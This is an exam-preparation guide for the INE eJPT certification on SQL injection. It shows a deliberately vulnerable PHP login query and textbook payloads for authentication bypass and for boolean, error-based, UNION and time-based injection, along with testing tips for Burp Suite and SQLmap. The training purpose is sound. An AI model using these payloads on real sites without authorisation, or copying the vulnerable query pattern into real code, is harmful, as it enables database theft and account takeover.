# SQL Injection (SQLi)

SQL Injection (SQLi) is one of the most common and dangerous web application vulnerabilities. It occurs when an application fails to properly validate user input before including it in an SQL query. An attacker can manipulate the query to read, modify, or delete data, bypass authentication, and sometimes even execute commands on the underlying operating system.

SQL Injection is one of the most important topics for the **INE eJPT** exam and is frequently encountered during real-world web application assessments.

---

# How SQL Injection Works

A vulnerable application builds SQL queries using user input.

Example:

```
User Input

↓

Web Application

↓

SQL Query

↓

Database

↓

Response
```

If the application does not sanitize user input, an attacker can inject SQL code into the query.

---

# Example Vulnerable Query

PHP code:

```php
$query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
```

User input:

```
admin
```

Generated query:

```sql
SELECT * FROM users
WHERE username='admin'
AND password='password';
```

---

# SQL Injection Example

Input:

```
admin' --
```

Query becomes:

```sql
SELECT * FROM users
WHERE username='admin' -- '
AND password='password';
```

Everything after `--` is ignored, potentially bypassing authentication.

# Authentication Bypass

Original login:

```
Username:

admin

Password:

password
```

Payload:

```
admin' --
```

Another example:

```
' OR '1'='1
```

Query:

```sql
SELECT *
FROM users
WHERE username=''
OR '1'='1';
```

---

# Boolean-Based SQL Injection

Test:

```
?id=1 AND 1=1
```

Then:

```
?id=1 AND 1=2
```

If responses differ, the parameter may be injectable.

---

# Error-Based SQL Injection

Payload:

```
'
```

Possible error:

```
You have an error in your SQL syntax...
```

The error confirms that user input reaches the SQL query.

---

# UNION-Based SQL Injection

Determine the number of columns.

```
ORDER BY 1

ORDER BY 2

ORDER BY 3

ORDER BY 4
```

Continue until an error appears.

---

# Finding Column Count

Example:

```
?id=1 ORDER BY 1

?id=1 ORDER BY 2

?id=1 ORDER BY 3

?id=1 ORDER BY 4
```

If `ORDER BY 5` fails, the query likely contains **4 columns**.

---

# UNION SELECT

Once the column count is known:

```sql
UNION SELECT NULL,NULL,NULL,NULL
```

Replace `NULL` values with data.

Example:

```sql
UNION SELECT NULL,version(),NULL,NULL
```

# Time-Based SQL Injection

Useful when errors are hidden.

MySQL:

```sql
SLEEP(5)
```

SQL Server:

```sql
WAITFOR DELAY '0:0:5'
```

PostgreSQL:

```sql
pg_sleep(5)
```

Example:

```
?id=1 AND SLEEP(5)
```

A delayed response indicates successful injection.

---

# Blind SQL Injection

When no errors are displayed.

Example:

```
?id=1 AND 1=1
```

```
?id=1 AND 1=2
```

Compare:

- Response content
- Response length
- Response time

# Common Mistakes

Avoid these mistakes:

- Assuming every error is SQL Injection.
- Skipping column count enumeration before using `UNION`.
- Forgetting database-specific syntax.
- Ignoring response length and timing differences.
- Testing only GET parameters.
- Forgetting POST requests and cookies.

---

# eJPT Tips

During the **INE eJPT** exam:

- Test every input field and URL parameter for SQL Injection.
- Start with simple payloads such as `'`, `"`, and `--`.
- Use **ORDER BY** to determine the number of columns.
- Use **UNION SELECT** to retrieve database information.
- If errors are hidden, switch to **Boolean-Based** or **Time-Based** SQL Injection.
- Use **Burp Repeater** for manual testing and **Burp Intruder** for payload automation.
- If SQL Injection is confirmed, consider using **SQLmap** for automated exploitation when appropriate.

# Summary

SQL Injection is a vulnerability that allows attackers to manipulate SQL queries executed by a web application. Successful exploitation can lead to authentication bypass, database enumeration, data extraction, and, in some cases, complete server compromise. A systematic approach—testing for errors, determining the number of columns, performing UNION-based queries, and using Boolean or Time-Based techniques when necessary—is essential for identifying and exploiting SQL Injection vulnerabilities. Mastering SQL Injection and Burp Suite is a fundamental requirement for both real-world web penetration testing and the **INE eJPT** certification exam.
